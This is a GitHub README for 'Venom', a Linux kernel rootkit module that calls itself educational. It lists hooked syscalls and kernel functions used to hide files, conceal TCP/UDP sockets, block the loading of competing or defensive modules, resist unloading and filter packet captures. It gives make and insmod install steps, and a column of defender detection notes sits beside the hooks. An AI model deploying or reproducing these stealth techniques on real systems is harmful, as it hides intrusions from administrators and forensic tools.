<div align="center">
  <img src="https://i.postimg.cc/wBzfJZYW/venom.png" alt="banner" style="max-width:100%; border-radius:12px;"/> 
</div>

<h1 align="center">Venom</h1>

<div align="center">
  <strong>A poison that sleeps in the kernel’s veins</strong><br>
  <b><i>A Linux Kernel Module</i></b> 
</div>

--- 

> [!Important]
> Venom — educational only. This repository explains concepts and historic categories of kernel/userland malware so defenders can recognize, study, and detect them. Use only in legal, controlled environments (isolated VMs, CTF labs you own, or instructor-approved training).


## Features

* <span style="color:#ffb86b">Output interception</span>
  * Concept: intercepts kernel write paths to monitor or protect tracing/logging state (protect ftrace).

* <span style="color:#ffb86b">Input interception</span>
  * Concept: intercepts kernel read paths to monitor or sanitize reads that might reveal internal state (protect ftrace).

* <span style="color:#70a1ff">Directory enumeration filtering (64-bit)</span>
  * Concept: filters directory listings to omit files/directories from ordinary enumeration (hide directories).

* <span style="color:#70a1ff">Directory enumeration filtering (32-bit/compat)**span>
  * Concept: same high-level role as getdents64 for compatibility layers — intercepts directory listing calls.

* <span style="color:#b39cff">Module load monitoring / control</span>
  * Concept: observes or blocks attempts to insert kernel modules (used to detect or prevent competing/intrusive modules).

* <span style="color:#b39cff">FD-based module load monitoring</span>
  * Concept: monitors file-descriptor based module loads (modern module insertion path) for the same protective purpose.

* <span style="color:#b39cff">Module unload monitoring / protection</span>
  * Concept: watches or intercepts module removal attempts (protects the running module or detects tampering).

* <span style="color:#7bed9f">Signal interception / control</span>
  * Concept: intercepts signal delivery paths to observe, block, or handle attempts to terminate or signal components.

* <span style="color:#ffa6c9">Device control / protection</span>
  * Concept: intercepts ioctl calls to device drivers (used to monitor or limit probes from forensic/protection tooling).

* <span style="color:#70a1ff">TCP /proc rendering hooks</span>
  * Concept: alters or filters TCP socket listings shown via /proc/net/tcp and /proc/net/tcp6 (used to conceal endpoints).

* <span style="color:#70a1ff">UDP /proc rendering hooks</span>
  * Concept: alters or filters UDP socket listings shown via /proc/net/udp and /proc/net/udp6.

* <span style="color:#70a1ff">Packet receive path interception</span>
  * Concept: intercepts raw packet receive paths (AF_PACKET/TPACKET) to filter or observe packets delivered to userland captures.
 

## Installation

```bash
git clone https://github.com/Trevohack/Venom
cd Venom
make
insmod venom.ko
```

- And let the venom spread 

<img width="1556" height="303" alt="image" src="https://github.com/user-attachments/assets/82250e22-c4c2-48a4-80f0-d9bed95e5778" />


## 📚 Documentation

The `docs` folder contains the project's design and reference material. Quick links:

- [Syscall Hooks (overview)](./docs/syscall_hooked.md) — which hooks are monitored and why (non-operational)  
- [Diagrams](./docs) — Flow and structure diagrams
- [Detection](./docs/detection) — defensive signals, suggested audit checks, and safe test advice

Browse the docs: [docs](./docs)


### Syscalls / Kernel hooks monitored by Venom

| Hook symbol | High-level purpose | Why Venom hooks it (intended behavior) | Defender notes / what to look for |
|-------------|--------------------|----------------------------------------|-----------------------------------|
| `__x64_sys_write` | Kernel entry for `write(2)` -> persistent output to files, pipes, fds | Intercept writes to protect internal tracing state (e.g. prevent ftrace / logging tampering) or to monitor/modify data leaving the host | Unexpected interception of write can alter logs; look for unusual file descriptor handling, unexpected buffering, or extra memcpy-like behavior. |
| `__x64_sys_read` | Kernel entry for `read(2)` -> reading from files, pipes, sockets | Intercept reads to protect ftrace and internal state (detect or sanitise reads that would reveal Venom internals) | Auditors should check for modified read return values, timing anomalies, or unusual reads on /proc devices. |
| `__x64_sys_getdents64` | Readdir-like kernel call used by `readdir(3)`/`ls` to enumerate directory entries | Commonly abused by rootkits to hide files/dirs; Venom hooks it to manage/hide its artifacts (and detect other hide attempts) | Look for filtered/modified directory listings, discrepancies between inode counts and listed entries, or processes that repeatedly call getdents. |
| `__x64_sys_getdents` | Older 32-bit getdents (kept for completeness on some kernels) | Same high-level intent as getdents64 — intercepts directory enumeration where applicable | Same as above; include 32-bit compatibility layers in audits. |
| `__x64_sys_init_module` | Loads a kernel module into the running kernel | Hooked to block/monitor insertion of other kernel modules (prevents competing kits or defensive drivers from loading) | Unexpected failures when inserting legitimate modules, suspicious denials in dmesg, or missing module list entries are red flags. |
| `__x64_sys_finit_module` | `init_module` variant that takes a file descriptor (modern module loading) | Hooked for the same reason as `init_module` — control module insertion paths that use fd-based loading | Inspect audit logs for failed `finit_module` syscalls; compare `lsmod` output vs. attempted loads. |
| `__x64_sys_delete_module` | Unloads a kernel module from the running kernel | Hooked to block deletion of Venom (protects against removal) or to detect attempts to remove other modules | Look for failed `delete_module` syscalls and modules that cannot be removed; check kthread activity and signal handling around unload operations. |
| `__x64_sys_kill` | Send signals to processes (including `SIGKILL`, `SIGTERM`) | Hooked to intercept attempts to signal/terminate Venom components — can be used to escalate/mitigate attempts to stop the rootkit or to capture privilege-escalation attempts | Repeated or oddly-timed `kill` calls against privileged processes can indicate tampering; audit which UIDs/PIDs are issuing signals. |
| `__x64_sys_ioctl` | Device and driver-specific controls (used heavily by kernel protection mechanisms) | Hooked to prevent or intercept harsh protection or forensic probes (e.g., ioctls from anti-rootkit drivers) | Unusual or blocked ioctl calls against character devices (esp. /dev/* related to tracing, kprobes, or ftrace) are suspicious. Audit ioctl arguments and caller credentials. |
| `tcp4_seq_show` / `tcp6_seq_show` | `seq_file` show functions used by `/proc/net/tcp` and `/proc/net/tcp6` to render socket lists | Hooked to hide/modify network socket listings (IPs/ports) so Venom's network activity is concealed | Compare kernel socket tables vs. observed network connections (ss/netstat/tcpdump). Discrepancies indicate tampering. |
| `udp4_seq_show` / `udp6_seq_show` | `seq_file` show functions for `/proc/net/udp` and `/proc/net/udp6` | Hooked to hide/modify UDP socket listings and protect IPs/ports Venom uses | Same as TCP — cross-check with packet captures and /proc/net content. |
| `tpacket_rcv` | Packet receive path for AF_PACKET/TPACKET (raw packet capture path) | Hooked to intercept packet receive, filter forensic captures, or protect traffic relating to Venom | Packet capture tools may see missing packets or altered timestamps; compare multiple capture points (host vs. bridge) to spot filtering. |

---

#### Quick guidance for readers (defensive)
- This table documents *which kernel touchpoints* Venom monitors and *why*.  
- If you are a defender: audit for the indicators in the rightmost column (e.g., mismatched `/proc` output, failed module loads, anomalies in read/write behavior, and differences between passive packet captures and `/proc/net`).  
- If you are a researcher: use isolated, instrumented environments (air-gapped VMs, offline snapshots) and follow responsible disclosure and legal guidelines before experimenting.



---

## Finishing Touches

Venom is not a weapon — it’s a **research & educational project**.  
Everything here is designed to help defenders, students, and researchers understand how kernel-level stealth techniques have historically worked, so they can better **detect, analyze, and defend** against them.

✔️ **Stay Responsible**  
Use this content only in safe, legal environments you fully control 

✔️ **Contribute for Good**  
Pull requests that improve documentation, defensive detection notes, or historical references are welcome. Contributions must follow the spirit of responsible research **no weaponized code, no operational exploits.**

✔️ **Respect the Ecosystem**  
This repo is about knowledge-sharing, not misuse. Always respect the boundaries of ethical hacking and your local laws. When in doubt, **don’t run it on production systems**.

---

> **Closing note:**  
> Security is about understanding *both sides* of the coin the offensive techniques and the defensive countermeasures. Venom exists so defenders can **see what’s possible** and **build stronger protections** in the future.  

---
